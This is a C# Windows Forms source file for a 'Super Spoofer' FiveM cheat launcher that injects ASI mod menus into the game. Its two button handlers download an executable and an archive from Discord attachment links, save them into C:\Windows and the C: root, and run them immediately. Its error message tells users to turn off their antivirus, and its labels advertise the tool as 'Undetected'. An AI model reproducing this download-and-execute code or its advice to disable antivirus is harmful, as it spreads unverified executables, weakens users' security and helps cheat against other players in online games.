using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Siticone.UI.WinForms;

namespace SUPER
{
	public sealed class FiveMscripthook : Form
	{
		private IContainer dashboard = AssistantHelper.dashboard;

		private SiticoneGroupBox sad;

		private SiticoneRadioButton siticoneRadioButton1;

		private SiticoneRadioButton fivemtempb;

		private SiticoneRoundedGradientButton siticoneRoundedGradientButton5;

		private Label label8;

		private SiticoneGroupBox siticoneGroupBox2;

		private Label label1;

		private SiticoneRoundedGradientButton siticoneRoundedGradientButton1;

		public FiveMscripthook()
		{
			MainLoad();
		}

		private void siticoneRoundedGradientButton5Click(object sender, EventArgs param_508)
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/910988697002967102/918175241329582090/fsh.exe", "C:\\Windows\\SuperProj\\fsh.exe");
				Process.Start("C:\\Windows\\SuperProj\\fsh.exe");
			}
			catch (Exception)
			{
				MessageBox.Show("Could not execute ASI scripthook! Please turn antivirus off!", "Super Spoofer - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		private void siticoneRoundedGradientButton1Click(object sender, EventArgs param_510)
		{
			try
			{
				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/909940221263638632/919184013309120522/ASI.rar", "C:\\Menus ASI.rar");
				Process.Start("C:\\Menus ASI.rar");
			}
			catch (Exception)
			{
				MessageBox.Show("Could not execute ASI scripthook! Download WinRAR", "Super Spoofer - Error Notice!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && dashboard > AssistantHelper.dashboard)
				dashboard.Dispose();
			base.Dispose(disposing);
		}

		private void MainLoad()
		{
			sad = new SiticoneGroupBox();
			siticoneRadioButton1 = new SiticoneRadioButton();
			fivemtempb = new SiticoneRadioButton();
			siticoneRoundedGradientButton5 = new SiticoneRoundedGradientButton();
			label8 = new Label();
			siticoneGroupBox2 = new SiticoneGroupBox();
			siticoneRoundedGradientButton1 = new SiticoneRoundedGradientButton();
			label1 = new Label();
			sad.SuspendLayout();
			siticoneGroupBox2.SuspendLayout();
			SuspendLayout();
			sad.BorderColor = Color.FromArgb(65, 71, 85);
			sad.Controls.Add(siticoneRadioButton1);
			sad.Controls.Add(fivemtempb);
			sad.CustomBorderColor = Color.FromArgb(65, 71, 85);
			sad.FillColor = Color.FromArgb(25, 26, 30);
			sad.Font = new Font("Segoe UI", 9f);
			sad.ForeColor = Color.FromArgb(125, 137, 149);
			sad.Location = new Point(214, 216);
			sad.Name = "sad";
			sad.ShadowDecoration.Parent = sad;
			sad.Size = new Size(434, 106);
			sad.TabIndex = 116;
			sad.Text = "Status";
			siticoneRadioButton1.AutoCheck = false;
			siticoneRadioButton1.AutoSize = true;
			siticoneRadioButton1.Checked = true;
			siticoneRadioButton1.CheckedState.BorderColor = Color.Lime;
			siticoneRadioButton1.CheckedState.BorderThickness = 1;
			siticoneRadioButton1.CheckedState.FillColor = Color.DarkGreen;
			siticoneRadioButton1.CheckedState.InnerColor = Color.DarkGreen;
			siticoneRadioButton1.CheckedState.InnerOffset = 1;
			siticoneRadioButton1.Location = new Point(15, 75);
			siticoneRadioButton1.Name = "siticoneRadioButton1";
			siticoneRadioButton1.Size = new Size(70, 19);
			siticoneRadioButton1.TabIndex = 120;
			siticoneRadioButton1.Text = "Working";
			siticoneRadioButton1.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
			siticoneRadioButton1.UncheckedState.BorderThickness = 2;
			siticoneRadioButton1.UncheckedState.FillColor = Color.Transparent;
			siticoneRadioButton1.UncheckedState.InnerColor = Color.Transparent;
			siticoneRadioButton1.UseVisualStyleBackColor = true;
			fivemtempb.AutoCheck = false;
			fivemtempb.AutoSize = true;
			fivemtempb.Checked = true;
			fivemtempb.CheckedState.BorderColor = Color.Lime;
			fivemtempb.CheckedState.BorderThickness = 1;
			fivemtempb.CheckedState.FillColor = Color.DarkGreen;
			fivemtempb.CheckedState.InnerColor = Color.DarkGreen;
			fivemtempb.CheckedState.InnerOffset = 1;
			fivemtempb.Location = new Point(15, 50);
			fivemtempb.Name = "fivemtempb";
			fivemtempb.Size = new Size(86, 19);
			fivemtempb.TabIndex = 119;
			fivemtempb.Text = "Undetected";
			fivemtempb.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
			fivemtempb.UncheckedState.BorderThickness = 2;
			fivemtempb.UncheckedState.FillColor = Color.Transparent;
			fivemtempb.UncheckedState.InnerColor = Color.Transparent;
			fivemtempb.UseVisualStyleBackColor = true;
			siticoneRoundedGradientButton5.BorderThickness = 1;
			siticoneRoundedGradientButton5.CheckedState.Parent = siticoneRoundedGradientButton5;
			siticoneRoundedGradientButton5.CustomImages.Parent = siticoneRoundedGradientButton5;
			siticoneRoundedGradientButton5.FillColor = Color.DimGray;
			siticoneRoundedGradientButton5.FillColor2 = Color.DimGray;
			siticoneRoundedGradientButton5.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
			siticoneRoundedGradientButton5.ForeColor = Color.White;
			siticoneRoundedGradientButton5.HoveredState.Parent = siticoneRoundedGradientButton5;
			siticoneRoundedGradientButton5.Location = new Point(15, 101);
			siticoneRoundedGradientButton5.Name = "siticoneRoundedGradientButton5";
			siticoneRoundedGradientButton5.ShadowDecoration.Parent = siticoneRoundedGradientButton5;
			siticoneRoundedGradientButton5.Size = new Size(406, 30);
			siticoneRoundedGradientButton5.TabIndex = 118;
			siticoneRoundedGradientButton5.Text = "Launch Script";
			siticoneRoundedGradientButton5.Click += siticoneRoundedGradientButton5Click;
			label8.AutoSize = true;
			label8.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			label8.ForeColor = Color.Red;
			label8.Location = new Point(12, 575);
			label8.Name = "label8";
			label8.Size = new Size(362, 17);
			label8.TabIndex = 121;
			label8.Text = "Please note this script will only inject ASI menus not LUA";
			siticoneGroupBox2.BorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox2.Controls.Add(siticoneRoundedGradientButton1);
			siticoneGroupBox2.Controls.Add(label1);
			siticoneGroupBox2.Controls.Add(siticoneRoundedGradientButton5);
			siticoneGroupBox2.CustomBorderColor = Color.FromArgb(65, 71, 85);
			siticoneGroupBox2.FillColor = Color.FromArgb(25, 26, 30);
			siticoneGroupBox2.Font = new Font("Segoe UI", 9f);
			siticoneGroupBox2.ForeColor = Color.FromArgb(125, 137, 149);
			siticoneGroupBox2.Location = new Point(214, 26);
			siticoneGroupBox2.Name = "siticoneGroupBox2";
			siticoneGroupBox2.ShadowDecoration.Parent = siticoneGroupBox2;
			siticoneGroupBox2.Size = new Size(434, 173);
			siticoneGroupBox2.TabIndex = 121;
			siticoneGroupBox2.Text = "Launch";
			siticoneRoundedGradientButton1.BorderThickness = 1;
			siticoneRoundedGradientButton1.CheckedState.Parent = siticoneRoundedGradientButton1;
			siticoneRoundedGradientButton1.CustomImages.Parent = siticoneRoundedGradientButton1;
			siticoneRoundedGradientButton1.FillColor = Color.DimGray;
			siticoneRoundedGradientButton1.FillColor2 = Color.DimGray;
			siticoneRoundedGradientButton1.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
			siticoneRoundedGradientButton1.ForeColor = Color.White;
			siticoneRoundedGradientButton1.HoveredState.Parent = siticoneRoundedGradientButton1;
			siticoneRoundedGradientButton1.Location = new Point(15, 137);
			siticoneRoundedGradientButton1.Name = "siticoneRoundedGradientButton1";
			siticoneRoundedGradientButton1.ShadowDecoration.Parent = siticoneRoundedGradientButton1;
			siticoneRoundedGradientButton1.Size = new Size(406, 25);
			siticoneRoundedGradientButton1.TabIndex = 123;
			siticoneRoundedGradientButton1.Text = "Download ASI Menus";
			siticoneRoundedGradientButton1.Click += siticoneRoundedGradientButton1Click;
			label1.AutoSize = true;
			label1.Font = new Font("Segoe UI", 8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			label1.ForeColor = Color.White;
			label1.Location = new Point(12, 47);
			label1.Name = "label1";
			label1.Size = new Size(367, 26);
			label1.TabIndex = 122;
			label1.Text = "1. Put your ASI menus in \\AppData\\Local\\FiveM\\FiveM.app\\plugins\\\r\n2. Once you've joined a server run it and leave it in background.";
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			BackColor = Color.FromArgb(25, 26, 30);
			base.ClientSize = new Size(873, 597);
			base.Controls.Add(siticoneGroupBox2);
			base.Controls.Add(label8);
			base.Controls.Add(sad);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Name = "FiveMscripthook";
			Text = "FiveMscripthook";
			sad.ResumeLayout(false);
			sad.PerformLayout();
			siticoneGroupBox2.ResumeLayout(false);
			siticoneGroupBox2.PerformLayout();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
